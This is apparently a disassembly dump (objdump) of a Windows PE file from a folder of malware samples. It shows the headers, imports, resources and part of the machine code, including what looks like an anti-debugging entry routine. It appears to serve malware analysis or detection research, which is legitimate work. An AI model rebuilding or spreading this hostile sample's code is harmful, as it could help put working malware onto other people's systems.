
/home/kali/Desktop/TTDN/100malware_AE_ver2/3fdb31c6da60d4125b0a5b5995edf89c4a8146b1908f7a55b0f01f36e7679ccc.exe:     file format pei-i386
/home/kali/Desktop/TTDN/100malware_AE_ver2/3fdb31c6da60d4125b0a5b5995edf89c4a8146b1908f7a55b0f01f36e7679ccc.exe
architecture: i386, flags 0x0000010a:
EXEC_P, HAS_DEBUG, D_PAGED
start address 0x004014bc

Characteristics 0x10f
	relocations stripped
	executable
	line numbers stripped
	symbols stripped
	32 bit words

Time/Date		Thu Jan  1 08:00:00 1970
Magic			010b	(PE32)
MajorLinkerVersion	12
MinorLinkerVersion	0
SizeOfCode		00001600
SizeOfInitializedData	00079800
SizeOfUninitializedData	00000000
AddressOfEntryPoint	000014bc
BaseOfCode		00001000
BaseOfData		00003000
ImageBase		00400000
SectionAlignment	00001000
FileAlignment		00000200
MajorOSystemVersion	4
MinorOSystemVersion	0
MajorImageVersion	0
MinorImageVersion	0
MajorSubsystemVersion	4
MinorSubsystemVersion	0
Win32Version		00000000
SizeOfImage		000d9000
SizeOfHeaders		00000400
CheckSum		00000000
Subsystem		00000002	(Windows GUI)
DllCharacteristics	00000000
SizeOfStackReserve	00100000
SizeOfStackCommit	00001000
SizeOfHeapReserve	00100000
SizeOfHeapCommit	00001000
LoaderFlags		00000000
NumberOfRvaAndSizes	00000010

The Data Directory
Entry 0 00000000 00000000 Export Directory [.edata (or where ever we found it)]
Entry 1 000030b0 00000078 Import Directory [parts of .idata]
Entry 2 00060000 000788b2 Resource Directory [.rsrc]
Entry 3 0005f000 0000005c Exception Directory [.pdata]
Entry 4 00000000 00000000 Security Directory
Entry 5 00000000 00000000 Base Relocation Directory [.reloc]
Entry 6 00000000 00000000 Debug Directory
Entry 7 00000000 00000000 Description Directory
Entry 8 00000000 00000000 Special Directory
Entry 9 00000000 00000000 Thread Storage Directory [.tls]
Entry a 00000000 00000000 Load Configuration Directory
Entry b 00000000 00000000 Bound Import Directory
Entry c 00000000 00000000 Import Address Table Directory
Entry d 00000000 00000000 Delay Import Directory
Entry e 00000000 00000000 CLR Runtime Header
Entry f 00000000 00000000 Reserved

There is an import table in .rdata at 0x4030b0

The Import Tables (interpreted .rdata section contents)
 vma:            Hint    Time      Forward  DLL       First
                 Table   Stamp     Chain    Name      Thunk
 000030b0	00003114 00000000 00000000 00003326 00003000

	DLL Name: KERNEL32.dll
	vma:  Hint/Ord Member-Name Bound-To
	3310	  487  GetFileAttributesA
	326e	  579  GetPrivateProfileStringW
	322a	  302  FindClose
	32d0	 1114  SetEvent
	31f2	  961  ReadFile
	329a	  154  CreateMailslotA
	328a	 1140  SetLastError
	3214	  455  GetCurrentThreadId
	32f8	  240  EnterCriticalSection
	32c0	  469  GetDriveTypeW
	324c	  403  GetConsoleAliasW
	32dc	 1211  SuspendThread
	31d0	  241  EnumCalendarInfoW
	32ec	  841  LocalFree
	3236	  533  GetModuleFileNameA
	31c4	   85  FindAtomW
	31fe	  451  GetCurrentProcessId
	3260	  700  GlobalFree
	31e4	  719  HeapCreate
	32ac	  832  GetModuleHandleA

 000030c4	00003168 00000000 00000000 000033fe 00003054

	DLL Name: USER32.dll
	vma:  Hint/Ord Member-Name Bound-To
	336a	 1683  DispatchMessageA
	33ae	 1888  GetSysColor
	33e2	 1776  GetClassInfoA
	33bc	 2171  SetFocus
	33a0	 1826  GetKeyState
	33f2	 1974  IsWindow
	33c8	 1715  DrawTextW
	3348	 1796  GetCursorInfo
	3390	 1785  GetClientRect
	337e	 1532  CallWindowProcW
	33d4	 1845  GetMenuInfo
	3358	 1832  GetKeyboardType
	3334	 1683  DispatchMessageA

 000030d8	000031a0 00000000 00000000 0000345a 0000308c

	DLL Name: AVICAP32.dll
	vma:  Hint/Ord Member-Name Bound-To
	344a	    6  videoThunk32
	343a	    6  videoThunk32
	341a	    6  videoThunk32
	340a	    6  videoThunk32
	342a	    6  videoThunk32

 000030ec	000031b8 00000000 00000000 00003480 000030a4

	DLL Name: DESK.cpl
	vma:  Hint/Ord Member-Name Bound-To
	3468	    2  DeskSetCurrentScheme

 00003100	00000000 00000000 00000000 00000000 00000000

The .rsrc Resource Directory section:
000  Type Table: Char: 0, Time: 00000000, Ver: 0/0, Num Names: 0, IDs: 3
010   Entry: ID: 0x000003, Value: 0x80000028
028    Name Table: Char: 0, Time: 00000000, Ver: 0/0, Num Names: 0, IDs: 6
038     Entry: ID: 0x000001, Value: 0x80000098
098      Language Table: Char: 0, Time: 00000000, Ver: 0/0, Num Names: 0, IDs: 1
0a8       Entry: ID: 0x000408, Value: 0x000158
158        Leaf: Addr: 0x0601d8, Size: 0x0025a8, Codepage: 0
040     Entry: ID: 0x000002, Value: 0x800000b0
0b0      Language Table: Char: 0, Time: 00000000, Ver: 0/0, Num Names: 0, IDs: 1
0c0       Entry: ID: 0x000408, Value: 0x000168
168        Leaf: Addr: 0x062780, Size: 0x0010a8, Codepage: 0
048     Entry: ID: 0x000003, Value: 0x800000c8
0c8      Language Table: Char: 0, Time: 00000000, Ver: 0/0, Num Names: 0, IDs: 1
0d8       Entry: ID: 0x000408, Value: 0x000178
178        Leaf: Addr: 0x063828, Size: 0x000eb0, Codepage: 0
050     Entry: ID: 0x000004, Value: 0x800000e0
0e0      Language Table: Char: 0, Time: 00000000, Ver: 0/0, Num Names: 0, IDs: 1
0f0       Entry: ID: 0x000408, Value: 0x000188
188        Leaf: Addr: 0x0646d8, Size: 0x000cd8, Codepage: 0
058     Entry: ID: 0x000005, Value: 0x800000f8
0f8      Language Table: Char: 0, Time: 00000000, Ver: 0/0, Num Names: 0, IDs: 1
108       Entry: ID: 0x000408, Value: 0x000198
198        Leaf: Addr: 0x0653b0, Size: 0x000b20, Codepage: 0
060     Entry: ID: 0x000006, Value: 0x80000110
110      Language Table: Char: 0, Time: 00000000, Ver: 0/0, Num Names: 0, IDs: 1
120       Entry: ID: 0x000408, Value: 0x0001a8
1a8        Leaf: Addr: 0x065ed0, Size: 0x000988, Codepage: 0
018   Entry: ID: 0x00000e, Value: 0x80000068
068    Name Table: Char: 0, Time: 00000000, Ver: 0/0, Num Names: 0, IDs: 1
078     Entry: ID: 0x0001f4, Value: 0x80000128
128      Language Table: Char: 0, Time: 00000000, Ver: 0/0, Num Names: 0, IDs: 1
138       Entry: ID: 0x000408, Value: 0x0001b8
1b8        Leaf: Addr: 0x066858, Size: 0x00005a, Codepage: 0
020   Entry: ID: 0x00000e, Value: 0x80000080
080    Name Table: Char: 0, Time: 00000000, Ver: 0/0, Num Names: 0, IDs: 1
090     Entry: ID: 0x0001f4, Value: 0x80000140
140      Language Table: Char: 0, Time: 00000000, Ver: 0/0, Num Names: 0, IDs: 1
150       Entry: ID: 0x000408, Value: 0x0001c8
1c8        Leaf: Addr: 0x0668b2, Size: 0x052000, Codepage: 0
 Resources start at offset: 0x1d8

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
  0 .text         00001574  00401000  00401000  00000a00  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
  1 .rdata        00000600  00403000  00403000  00002400  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  2 .data         0000060a  0045f000  0045f000  00002e00  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  3 .rsrc         000788b2  00460000  00460000  00003a00  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
SYMBOL TABLE:
no symbols



Disassembly of section .text:

00401000 <.text>:
  401000:	8b ff                	mov    %edi,%edi
  401002:	55                   	push   %ebp
  401003:	8b ec                	mov    %esp,%ebp
  401005:	83 ec 54             	sub    $0x54,%esp
  401008:	52                   	push   %edx
  401009:	ff b2 64 04 00 00    	push   0x464(%edx)
  40100f:	ff b2 c0 04 00 00    	push   0x4c0(%edx)
  401015:	53                   	push   %ebx
  401016:	ff b2 c4 03 00 00    	push   0x3c4(%edx)
  40101c:	e8 77 03 00 00       	call   0x401398
  401021:	83 c4 10             	add    $0x10,%esp
  401024:	5a                   	pop    %edx
  401025:	52                   	push   %edx
  401026:	6a 00                	push   $0x0
  401028:	68 68 30 40 00       	push   $0x403068
  40102d:	58                   	pop    %eax
  40102e:	2e ff 10             	call   *%cs:(%eax)
  401031:	5a                   	pop    %edx
  401032:	52                   	push   %edx
  401033:	8d 32                	lea    (%edx),%esi
  401035:	56                   	push   %esi
  401036:	68 4c 30 40 00       	push   $0x40304c
  40103b:	58                   	pop    %eax
  40103c:	2e ff 10             	call   *%cs:(%eax)
  40103f:	85 c0                	test   %eax,%eax
  401041:	75 f0                	jne    0x401033
  401043:	5a                   	pop    %edx
  401044:	83 ec ac             	sub    $0xffffffac,%esp
  401047:	8b 2c 24             	mov    (%esp),%ebp
  40104a:	83 c4 04             	add    $0x4,%esp
  40104d:	c3                   	ret
  40104e:	00 00                	add    %al,(%eax)
  401050:	8b ff                	mov    %edi,%edi
  401052:	55                   	push   %ebp
  401053:	8b ec                	mov    %esp,%ebp
  401055:	83 ec 2c             	sub    $0x2c,%esp
  401058:	52                   	push   %edx
  401059:	b8 00 00 00 00       	mov    $0x0,%eax
  40105e:	50                   	push   %eax
  40105f:	68 08 30 40 00       	push   $0x403008
  401064:	58                   	pop    %eax
  401065:	2e ff 10             	call   *%cs:(%eax)
  401068:	5a                   	pop    %edx
  401069:	52                   	push   %edx
  40106a:	50                   	push   %eax
  40106b:	ff 72 6c             	push   0x6c(%edx)
  40106e:	e8 e9 01 00 00       	call   0x40125c
  401073:	83 c4 08             	add    $0x8,%esp
  401076:	5a                   	pop    %edx
  401077:	52                   	push   %edx
  401078:	bf 00 00 00 00       	mov    $0x0,%edi
  40107d:	57                   	push   %edi
  40107e:	68 60 30 40 00       	push   $0x403060
  401083:	58                   	pop    %eax
  401084:	2e ff 10             	call   *%cs:(%eax)
  401087:	5a                   	pop    %edx
  401088:	83 ec d4             	sub    $0xffffffd4,%esp
  40108b:	8b 2c 24             	mov    (%esp),%ebp
  40108e:	83 c4 04             	add    $0x4,%esp
  401091:	c3                   	ret
  401092:	00 00                	add    %al,(%eax)
  401094:	8b ff                	mov    %edi,%edi
  401096:	60                   	pusha
  401097:	55                   	push   %ebp
  401098:	8b ec                	mov    %esp,%ebp
  40109a:	83 ec 5c             	sub    $0x5c,%esp
  40109d:	52                   	push   %edx
  40109e:	be 00 00 00 00       	mov    $0x0,%esi
  4010a3:	56                   	push   %esi
  4010a4:	68 3c 30 40 00       	push   $0x40303c
  4010a9:	58                   	pop    %eax
  4010aa:	2e ff 10             	call   *%cs:(%eax)
  4010ad:	5a                   	pop    %edx
  4010ae:	85 c0                	test   %eax,%eax
  4010b0:	74 01                	je     0x4010b3
  4010b2:	c3                   	ret
  4010b3:	52                   	push   %edx
  4010b4:	6a 00                	push   $0x0
  4010b6:	68 44 30 40 00       	push   $0x403044
  4010bb:	58                   	pop    %eax
  4010bc:	2e ff 10             	call   *%cs:(%eax)
  4010bf:	5a                   	pop    %edx
  4010c0:	52                   	push   %edx
  4010c1:	51                   	push   %ecx
  4010c2:	ff 72 30             	push   0x30(%edx)
  4010c5:	e8 e6 0b 00 00       	call   0x401cb0
  4010ca:	83 c4 08             	add    $0x8,%esp
  4010cd:	5a                   	pop    %edx
  4010ce:	b9 4c 30 40 00       	mov    $0x40304c,%ecx
  4010d3:	8b 09                	mov    (%ecx),%ecx
  4010d5:	51                   	push   %ecx
  4010d6:	ff b2 f0 02 00 00    	push   0x2f0(%edx)
  4010dc:	5b                   	pop    %ebx
  4010dd:	ff d3                	call   *%ebx
  4010df:	83 ec a4             	sub    $0xffffffa4,%esp
  4010e2:	8b 2c 24             	mov    (%esp),%ebp
  4010e5:	83 c4 04             	add    $0x4,%esp
  4010e8:	c3                   	ret
  4010e9:	00 00                	add    %al,(%eax)
  4010eb:	00 00                	add    %al,(%eax)
  4010ed:	00 00                	add    %al,(%eax)
  4010ef:	00 0f                	add    %cl,(%edi)
  4010f1:	87 9e ff ff ff 00    	xchg   %ebx,0xffffff(%esi)
  4010f7:	00 8b ff 55 8b ec    	add    %cl,-0x1374aa01(%ebx)
  4010fd:	83 ec 38             	sub    $0x38,%esp
  401100:	52                   	push   %edx
  401101:	ff b2 78 04 00 00    	push   0x478(%edx)
  401107:	53                   	push   %ebx
  401108:	57                   	push   %edi
  401109:	e8 b2 07 00 00       	call   0x4018c0
  40110e:	83 c4 0c             	add    $0xc,%esp
  401111:	5a                   	pop    %edx
  401112:	52                   	push   %edx
  401113:	68 1c 30 40 00       	push   $0x40301c
  401118:	58                   	pop    %eax
  401119:	2e ff 10             	call   *%cs:(%eax)
  40111c:	5a                   	pop    %edx
  40111d:	52                   	push   %edx
  40111e:	6a 00                	push   $0x0
  401120:	68 24 30 40 00       	push   $0x403024
  401125:	58                   	pop    %eax
  401126:	2e ff 10             	call   *%cs:(%eax)
  401129:	5a                   	pop    %edx
  40112a:	83 ec c8             	sub    $0xffffffc8,%esp
  40112d:	8b 2c 24             	mov    (%esp),%ebp
  401130:	83 c4 04             	add    $0x4,%esp
  401133:	c3                   	ret
  401134:	00 00                	add    %al,(%eax)
  401136:	00 00                	add    %al,(%eax)
  401138:	8b ff                	mov    %edi,%edi
  40113a:	55                   	push   %ebp
  40113b:	8b ec                	mov    %esp,%ebp
  40113d:	83 ec 44             	sub    $0x44,%esp
  401140:	52                   	push   %edx
  401141:	6a 00                	push   $0x0
  401143:	68 68 30 40 00       	push   $0x403068
  401148:	58                   	pop    %eax
  401149:	2e ff 10             	call   *%cs:(%eax)
  40114c:	5a                   	pop    %edx
  40114d:	52                   	push   %edx
  40114e:	53                   	push   %ebx
  40114f:	57                   	push   %edi
  401150:	ff 72 40             	push   0x40(%edx)
  401153:	ff b2 3c 04 00 00    	push   0x43c(%edx)
  401159:	e8 96 0c 00 00       	call   0x401df4
  40115e:	83 c4 10             	add    $0x10,%esp
  401161:	5a                   	pop    %edx
  401162:	52                   	push   %edx
  401163:	ba 00 00 00 00       	mov    $0x0,%edx
  401168:	52                   	push   %edx
  401169:	68 00 30 40 00       	push   $0x403000
  40116e:	58                   	pop    %eax
  40116f:	2e ff 10             	call   *%cs:(%eax)
  401172:	5a                   	pop    %edx
  401173:	83 ec bc             	sub    $0xffffffbc,%esp
  401176:	8b 2c 24             	mov    (%esp),%ebp
  401179:	83 c4 04             	add    $0x4,%esp
  40117c:	c3                   	ret
  40117d:	00 00                	add    %al,(%eax)
  40117f:	00 8b ff 55 8b ec    	add    %cl,-0x1374aa01(%ebx)
  401185:	83 ec 30             	sub    $0x30,%esp
  401188:	52                   	push   %edx
  401189:	57                   	push   %edi
  40118a:	50                   	push   %eax
  40118b:	ff b2 78 05 00 00    	push   0x578(%edx)
  401191:	e8 86 0a 00 00       	call   0x401c1c
  401196:	83 c4 0c             	add    $0xc,%esp
  401199:	5a                   	pop    %edx
  40119a:	52                   	push   %edx
  40119b:	68 40 30 40 00       	push   $0x403040
  4011a0:	58                   	pop    %eax
  4011a1:	2e ff 10             	call   *%cs:(%eax)
  4011a4:	5a                   	pop    %edx
  4011a5:	52                   	push   %edx
  4011a6:	bf 00 00 00 00       	mov    $0x0,%edi
  4011ab:	57                   	push   %edi
  4011ac:	68 60 30 40 00       	push   $0x403060
  4011b1:	58                   	pop    %eax
  4011b2:	2e ff 10             	call   *%cs:(%eax)
  4011b5:	5a                   	pop    %edx
  4011b6:	83 ec d0             	sub    $0xffffffd0,%esp
  4011b9:	8b 2c 24             	mov    (%esp),%ebp
  4011bc:	83 c4 04             	add    $0x4,%esp
  4011bf:	c3                   	ret
  4011c0:	00 00                	add    %al,(%eax)
  4011c2:	00 00                	add    %al,(%eax)
  4011c4:	8b ff                	mov    %edi,%edi
  4011c6:	55                   	push   %ebp
  4011c7:	8b ec                	mov    %esp,%ebp
  4011c9:	83 ec 60             	sub    $0x60,%esp
  4011cc:	52                   	push   %edx
  4011cd:	ff b2 50 04 00 00    	push   0x450(%edx)
  4011d3:	51                   	push   %ecx
  4011d4:	57                   	push   %edi
  4011d5:	e8 da 03 00 00       	call   0x4015b4
  4011da:	83 c4 0c             	add    $0xc,%esp
  4011dd:	5a                   	pop    %edx
  4011de:	52                   	push   %edx
  4011df:	8d 02                	lea    (%edx),%eax
  4011e1:	50                   	push   %eax
  4011e2:	68 4c 30 40 00       	push   $0x40304c
  4011e7:	58                   	pop    %eax
  4011e8:	2e ff 10             	call   *%cs:(%eax)
  4011eb:	85 c0                	test   %eax,%eax
  4011ed:	75 f0                	jne    0x4011df
  4011ef:	5a                   	pop    %edx
  4011f0:	52                   	push   %edx
  4011f1:	6a 00                	push   $0x0
  4011f3:	68 08 30 40 00       	push   $0x403008
  4011f8:	58                   	pop    %eax
  4011f9:	2e ff 10             	call   *%cs:(%eax)
  4011fc:	5a                   	pop    %edx
  4011fd:	83 ec a0             	sub    $0xffffffa0,%esp
  401200:	8b 2c 24             	mov    (%esp),%ebp
  401203:	83 c4 04             	add    $0x4,%esp
  401206:	c3                   	ret
	...
  40120f:	00 8b ff 55 8b ec    	add    %cl,-0x1374aa01(%ebx)
  401215:	83 ec 60             	sub    $0x60,%esp
  401218:	52                   	push   %edx
  401219:	ba 00 00 00 00       	mov    $0x0,%edx
  40121e:	52                   	push   %edx
  40121f:	68 68 30 40 00       	push   $0x403068
  401224:	58                   	pop    %eax
  401225:	2e ff 10             	call   *%cs:(%eax)
  401228:	5a                   	pop    %edx
  401229:	52                   	push   %edx
  40122a:	57                   	push   %edi
  40122b:	57                   	push   %edi
  40122c:	ff b2 e4 05 00 00    	push   0x5e4(%edx)
  401232:	ff b2 48 02 00 00    	push   0x248(%edx)
  401238:	e8 d7 04 00 00       	call   0x401714
  40123d:	83 c4 10             	add    $0x10,%esp
  401240:	5a                   	pop    %edx
  401241:	52                   	push   %edx
  401242:	6a 00                	push   $0x0
  401244:	68 44 30 40 00       	push   $0x403044
  401249:	58                   	pop    %eax
  40124a:	2e ff 10             	call   *%cs:(%eax)
  40124d:	5a                   	pop    %edx
  40124e:	83 ec a0             	sub    $0xffffffa0,%esp
  401251:	8b 2c 24             	mov    (%esp),%ebp
  401254:	83 c4 04             	add    $0x4,%esp
  401257:	c3                   	ret
  401258:	00 00                	add    %al,(%eax)
  40125a:	00 00                	add    %al,(%eax)
  40125c:	8b ff                	mov    %edi,%edi
  40125e:	55                   	push   %ebp
  40125f:	8b ec                	mov    %esp,%ebp
  401261:	83 ec 60             	sub    $0x60,%esp
  401264:	52                   	push   %edx
  401265:	bb 00 00 00 00       	mov    $0x0,%ebx
  40126a:	53                   	push   %ebx
  40126b:	68 44 30 40 00       	push   $0x403044
  401270:	58                   	pop    %eax
  401271:	2e ff 10             	call   *%cs:(%eax)
  401274:	5a                   	pop    %edx
  401275:	52                   	push   %edx
  401276:	ff b2 28 05 00 00    	push   0x528(%edx)
  40127c:	53                   	push   %ebx
  40127d:	e8 aa 02 00 00       	call   0x40152c
  401282:	83 c4 08             	add    $0x8,%esp
  401285:	5a                   	pop    %edx
  401286:	52                   	push   %edx
  401287:	68 1c 30 40 00       	push   $0x40301c
  40128c:	58                   	pop    %eax
  40128d:	2e ff 10             	call   *%cs:(%eax)
  401290:	5a                   	pop    %edx
  401291:	83 ec a0             	sub    $0xffffffa0,%esp
  401294:	8b 2c 24             	mov    (%esp),%ebp
  401297:	83 c4 04             	add    $0x4,%esp
  40129a:	c3                   	ret
  40129b:	00 8b ff 55 8b ec    	add    %cl,-0x1374aa01(%ebx)
  4012a1:	83 ec 48             	sub    $0x48,%esp
  4012a4:	52                   	push   %edx
  4012a5:	bf 00 00 00 00       	mov    $0x0,%edi
  4012aa:	57                   	push   %edi
  4012ab:	68 60 30 40 00       	push   $0x403060
  4012b0:	58                   	pop    %eax
  4012b1:	2e ff 10             	call   *%cs:(%eax)
  4012b4:	5a                   	pop    %edx
  4012b5:	52                   	push   %edx
  4012b6:	57                   	push   %edi
  4012b7:	51                   	push   %ecx
  4012b8:	ff b2 e0 04 00 00    	push   0x4e0(%edx)
  4012be:	e8 29 00 00 00       	call   0x4012ec
  4012c3:	83 c4 0c             	add    $0xc,%esp
  4012c6:	5a                   	pop    %edx
  4012c7:	52                   	push   %edx
  4012c8:	be 00 00 00 00       	mov    $0x0,%esi
  4012cd:	56                   	push   %esi
  4012ce:	68 44 30 40 00       	push   $0x403044
  4012d3:	58                   	pop    %eax
  4012d4:	2e ff 10             	call   *%cs:(%eax)
  4012d7:	5a                   	pop    %edx
  4012d8:	83 ec b8             	sub    $0xffffffb8,%esp
  4012db:	8b 2c 24             	mov    (%esp),%ebp
  4012de:	83 c4 04             	add    $0x4,%esp
  4012e1:	c3                   	ret
	...
  4012ea:	00 00                	add    %al,(%eax)
  4012ec:	8b ff                	mov    %edi,%edi
  4012ee:	55                   	push   %ebp
  4012ef:	8b ec                	mov    %esp,%ebp
  4012f1:	83 ec 44             	sub    $0x44,%esp
  4012f4:	52                   	push   %edx
  4012f5:	ff b2 80 00 00 00    	push   0x80(%edx)
  4012fb:	ff b2 38 04 00 00    	push   0x438(%edx)
  401301:	ff b2 1c 02 00 00    	push   0x21c(%edx)
  401307:	e8 24 05 00 00       	call   0x401830
  40130c:	83 c4 0c             	add    $0xc,%esp
  40130f:	5a                   	pop    %edx
  401310:	52                   	push   %edx
  401311:	8d 12                	lea    (%edx),%edx
  401313:	52                   	push   %edx
  401314:	68 4c 30 40 00       	push   $0x40304c
  401319:	58                   	pop    %eax
  40131a:	2e ff 10             	call   *%cs:(%eax)
  40131d:	85 c0                	test   %eax,%eax
  40131f:	75 f0                	jne    0x401311
  401321:	5a                   	pop    %edx
  401322:	52                   	push   %edx
  401323:	be 00 00 00 00       	mov    $0x0,%esi
  401328:	56                   	push   %esi
  401329:	68 18 30 40 00       	push   $0x403018
  40132e:	58                   	pop    %eax
  40132f:	2e ff 10             	call   *%cs:(%eax)
  401332:	5a                   	pop    %edx
  401333:	83 ec bc             	sub    $0xffffffbc,%esp
  401336:	8b 2c 24             	mov    (%esp),%ebp
  401339:	83 c4 04             	add    $0x4,%esp
  40133c:	c3                   	ret
  40133d:	00 00                	add    %al,(%eax)
  40133f:	00 8b ff 55 8b ec    	add    %cl,-0x1374aa01(%ebx)
  401345:	83 ec 34             	sub    $0x34,%esp
  401348:	52                   	push   %edx
  401349:	8d 0a                	lea    (%edx),%ecx
  40134b:	51                   	push   %ecx
  40134c:	68 4c 30 40 00       	push   $0x40304c
  401351:	58                   	pop    %eax
  401352:	2e ff 10             	call   *%cs:(%eax)
  401355:	85 c0                	test   %eax,%eax
  401357:	75 f0                	jne    0x401349
  401359:	5a                   	pop    %edx
  40135a:	52                   	push   %edx
  40135b:	ff b2 0c 01 00 00    	push   0x10c(%edx)
  401361:	ff b2 e4 04 00 00    	push   0x4e4(%edx)
  401367:	ff b2 00 01 00 00    	push   0x100(%edx)
  40136d:	53                   	push   %ebx
  40136e:	e8 dd fc ff ff       	call   0x401050
  401373:	83 c4 10             	add    $0x10,%esp
  401376:	5a                   	pop    %edx
  401377:	52                   	push   %edx
  401378:	8d 0a                	lea    (%edx),%ecx
  40137a:	51                   	push   %ecx
  40137b:	68 4c 30 40 00       	push   $0x40304c
  401380:	58                   	pop    %eax
  401381:	2e ff 10             	call   *%cs:(%eax)
  401384:	85 c0                	test   %eax,%eax
  401386:	75 f0                	jne    0x401378
  401388:	5a                   	pop    %edx
  401389:	83 ec cc             	sub    $0xffffffcc,%esp
  40138c:	8b 2c 24             	mov    (%esp),%ebp
  40138f:	83 c4 04             	add    $0x4,%esp
  401392:	c3                   	ret
  401393:	00 00                	add    %al,(%eax)
  401395:	00 00                	add    %al,(%eax)
  401397:	00 8b ff 55 8b ec    	add    %cl,-0x1374aa01(%ebx)
  40139d:	83 ec 24             	sub    $0x24,%esp
  4013a0:	52                   	push   %edx
  4013a1:	ff b2 08 02 00 00    	push   0x208(%edx)
  4013a7:	ff b2 48 05 00 00    	push   0x548(%edx)
  4013ad:	51                   	push   %ecx
  4013ae:	e8 19 06 00 00       	call   0x4019cc
  4013b3:	83 c4 0c             	add    $0xc,%esp
  4013b6:	5a                   	pop    %edx
  4013b7:	52                   	push   %edx
  4013b8:	68 40 30 40 00       	push   $0x403040
  4013bd:	58                   	pop    %eax
  4013be:	2e ff 10             	call   *%cs:(%eax)
  4013c1:	5a                   	pop    %edx
  4013c2:	52                   	push   %edx
  4013c3:	b9 00 00 00 00       	mov    $0x0,%ecx
  4013c8:	51                   	push   %ecx
  4013c9:	68 24 30 40 00       	push   $0x403024
  4013ce:	58                   	pop    %eax
  4013cf:	2e ff 10             	call   *%cs:(%eax)
  4013d2:	5a                   	pop    %edx
  4013d3:	83 ec dc             	sub    $0xffffffdc,%esp
  4013d6:	8b 2c 24             	mov    (%esp),%ebp
  4013d9:	83 c4 04             	add    $0x4,%esp
  4013dc:	c3                   	ret
  4013dd:	00 00                	add    %al,(%eax)
  4013df:	00 8b ff 55 8b ec    	add    %cl,-0x1374aa01(%ebx)
  4013e5:	83 ec 34             	sub    $0x34,%esp
  4013e8:	52                   	push   %edx
  4013e9:	57                   	push   %edi
  4013ea:	ff b2 54 05 00 00    	push   0x554(%edx)
  4013f0:	57                   	push   %edi
  4013f1:	50                   	push   %eax
  4013f2:	e8 91 05 00 00       	call   0x401988
  4013f7:	83 c4 10             	add    $0x10,%esp
  4013fa:	5a                   	pop    %edx
  4013fb:	52                   	push   %edx
  4013fc:	68 40 30 40 00       	push   $0x403040
  401401:	58                   	pop    %eax
  401402:	2e ff 10             	call   *%cs:(%eax)
  401405:	5a                   	pop    %edx
  401406:	52                   	push   %edx
  401407:	8d 32                	lea    (%edx),%esi
  401409:	56                   	push   %esi
  40140a:	68 4c 30 40 00       	push   $0x40304c
  40140f:	58                   	pop    %eax
  401410:	2e ff 10             	call   *%cs:(%eax)
  401413:	85 c0                	test   %eax,%eax
  401415:	75 f0                	jne    0x401407
  401417:	5a                   	pop    %edx
  401418:	83 ec cc             	sub    $0xffffffcc,%esp
  40141b:	8b 2c 24             	mov    (%esp),%ebp
  40141e:	83 c4 04             	add    $0x4,%esp
  401421:	c3                   	ret
  401422:	00 00                	add    %al,(%eax)
  401424:	8b ff                	mov    %edi,%edi
  401426:	55                   	push   %ebp
  401427:	8b ec                	mov    %esp,%ebp
  401429:	83 ec 38             	sub    $0x38,%esp
  40142c:	52                   	push   %edx
  40142d:	8d 1a                	lea    (%edx),%ebx
  40142f:	53                   	push   %ebx
  401430:	68 4c 30 40 00       	push   $0x40304c
  401435:	58                   	pop    %eax
  401436:	2e ff 10             	call   *%cs:(%eax)
  401439:	85 c0                	test   %eax,%eax
  40143b:	75 f0                	jne    0x40142d
  40143d:	5a                   	pop    %edx
  40143e:	52                   	push   %edx
  40143f:	50                   	push   %eax
  401440:	51                   	push   %ecx
  401441:	50                   	push   %eax
  401442:	e8 69 06 00 00       	call   0x401ab0
  401447:	83 c4 0c             	add    $0xc,%esp
  40144a:	5a                   	pop    %edx
  40144b:	52                   	push   %edx
  40144c:	6a 00                	push   $0x0
  40144e:	68 24 30 40 00       	push   $0x403024
  401453:	58                   	pop    %eax
  401454:	2e ff 10             	call   *%cs:(%eax)
  401457:	5a                   	pop    %edx
  401458:	83 ec c8             	sub    $0xffffffc8,%esp
  40145b:	8b 2c 24             	mov    (%esp),%ebp
  40145e:	83 c4 04             	add    $0x4,%esp
  401461:	c3                   	ret
  401462:	00 00                	add    %al,(%eax)
  401464:	00 00                	add    %al,(%eax)
  401466:	00 00                	add    %al,(%eax)
  401468:	8b ff                	mov    %edi,%edi
  40146a:	55                   	push   %ebp
  40146b:	8b ec                	mov    %esp,%ebp
  40146d:	83 ec 54             	sub    $0x54,%esp
  401470:	52                   	push   %edx
  401471:	57                   	push   %edi
  401472:	57                   	push   %edi
  401473:	ff b2 fc 01 00 00    	push   0x1fc(%edx)
  401479:	e8 46 fd ff ff       	call   0x4011c4
  40147e:	83 c4 0c             	add    $0xc,%esp
  401481:	5a                   	pop    %edx
  401482:	52                   	push   %edx
  401483:	b9 00 00 00 00       	mov    $0x0,%ecx
  401488:	51                   	push   %ecx
  401489:	68 68 30 40 00       	push   $0x403068
  40148e:	58                   	pop    %eax
  40148f:	2e ff 10             	call   *%cs:(%eax)
  401492:	5a                   	pop    %edx
  401493:	52                   	push   %edx
  401494:	b9 00 00 00 00       	mov    $0x0,%ecx
  401499:	51                   	push   %ecx
  40149a:	68 2c 30 40 00       	push   $0x40302c
  40149f:	58                   	pop    %eax
  4014a0:	2e ff 10             	call   *%cs:(%eax)
  4014a3:	5a                   	pop    %edx
  4014a4:	83 ec ac             	sub    $0xffffffac,%esp
  4014a7:	8b 2c 24             	mov    (%esp),%ebp
  4014aa:	83 c4 04             	add    $0x4,%esp
  4014ad:	c3                   	ret
	...
  4014ba:	00 00                	add    %al,(%eax)
  4014bc:	6a 00                	push   $0x0
  4014be:	81 04 24 00 f0 45 00 	addl   $0x45f000,(%esp)
  4014c5:	ff 35 90 30 40 00    	push   0x403090
  4014cb:	58                   	pop    %eax
  4014cc:	66 33 c0             	xor    %ax,%ax
  4014cf:	13 40 3c             	adc    0x3c(%eax),%eax
  4014d2:	80 78 1d 80          	cmpb   $0x80,0x1d(%eax)
  4014d6:	72 06                	jb     0x4014de
  4014d8:	5a                   	pop    %edx
  4014d9:	e9 12 fc ff ff       	jmp    0x4010f0
  4014de:	33 e4                	xor    %esp,%esp
  4014e0:	cd 03                	int    $0x3
  4014e2:	00 00                	add    %al,(%eax)
  4014e4:	8b ff                	mov    %edi,%edi
  4014e6:	55                   	push   %ebp
  4014e7:	8b ec                	mov    %esp,%ebp
  4014e9:	83 ec 5c             	sub    $0x5c,%esp
  4014ec:	52                   	push   %edx
  4014ed:	68 40 30 40 00       	push   $0x403040
  4014f2:	58                   	pop    %eax
